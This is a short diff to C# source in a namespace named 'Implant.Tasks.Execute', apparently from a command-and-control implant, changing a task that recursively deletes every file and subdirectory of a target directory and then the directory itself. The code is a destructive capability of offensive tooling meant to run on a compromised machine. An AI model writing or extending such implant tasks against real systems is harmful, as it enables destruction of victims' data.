@@ -17,10 +17,12 @@ namespace Implant.Tasks.Execute
             DirectoryInfo dirData = new DirectoryInfo(targetDir);
 
             foreach(FileInfo cFile in dirData.GetFiles()) { cFile.Delete(); }
-            foreach(DirectoryInfo dir in dirData.GetDirectories()) { dir.Delete(true); }
+            foreach(DirectoryInfo cDir in dirData.GetDirectories()) { cDir.Delete(true); }
+            
+            Directory.Delete(targetDir, true);
 
-            if(!(dirData.Exists)) { return $"[*] {targetDir} removed"; }
-            return $"[-] Failed to remove {targetDir}";
+            if(!(dirData.Exists)) { return $"[*] {targetDir} removed\n"; }
+            return $"[-] Failed to remove {targetDir}\n";
         }
     }
 }
